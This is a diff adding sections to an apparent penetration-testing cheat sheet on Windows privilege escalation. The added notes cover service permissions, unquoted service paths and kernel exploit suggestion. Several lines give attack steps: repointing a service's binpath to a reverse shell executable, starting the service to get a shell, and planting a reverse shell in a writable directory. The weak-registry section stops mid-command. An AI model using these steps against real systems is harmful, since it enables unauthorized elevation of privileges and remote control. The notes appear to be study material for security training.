@@ -46,6 +46,71 @@ accesschk.exe -uws "Everyone" "<Path to DIR>" // Will check for w-W files
 [powershell]
 Get-ChildItem "<PATH TO DIR>" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
 ```
+###### Kernel Exploits
+```
+Download systeminfo 
+Run in on kali through windows-exploit-suggester
+```
+###### Service Commands
+```
+Query the configuation of a service:
+- sc.exe qc <name>
+Query the current status of a service
+- sc.exe query <name>
+Modify a configuration option of a service
+- sc.exe config <name> <options>= <value>
+Start/Stop a service <name>
+- net start/stop <name>
+```
+###### Insecure Service Permissions 
+```
+Innocuous = SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS
+Useful = SERVICE_STOP, SERVICE_START
+Dangerous = SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS
+-------
+If you cant stop/start a service, it doesnt matter if you can change anytihng (rabbithole)
+
+.\achesschk.exe /accepteula -uwcqv user <service> ###Checking access permissions
+
+then
+
+sc.exe qc <service> ### will show path/and if you can start manually, 
+
+sc config <service> binpath= "\""C:\path\to\reverse\shell.exe"" #### set binary path to a reverse shell.
+
+net start <service> ####start the service to get shell
+--------
+````
+###### Unqouted Service Pahts
+```
+
+EXAMPLE C:\Program Files\Big Dir\Common files\SomeExecutable.exe
+
+To execute the exe, windows first checks everything before it, with spaces and unqoutes. 
+
+So remember in this instance. Program, Big, or Common could both be turned into .exe and pop a reverse shell
+
+1 Check if you have permissions to start the service 
+.\accesschk.exe \accepteula -ucqv user <unquotedsvc> 
+
+2. Check for write permissions on each directory within the binary path
+- .\accesschk.exe \accepteula -uwdq C:\
+-- .\accesschk.exe \accepteula -uwdq "C:\Program Files"
+--- .\accesschk.exe \accepteula -uwdq "C:\Program Files\Big Dir"
+
+### so in this example, we are going to put a reverse shell in Big Dir called common.exe
+
+```
+###### Weak Registry Permissions
+```
+Modidy a services configuatiion rather than the service
+
+Verify the permissions
+
+powershell -exec
+
+```
+
 ###### Enumerating Unmounted Disks for Windows
 ```
 mountvol
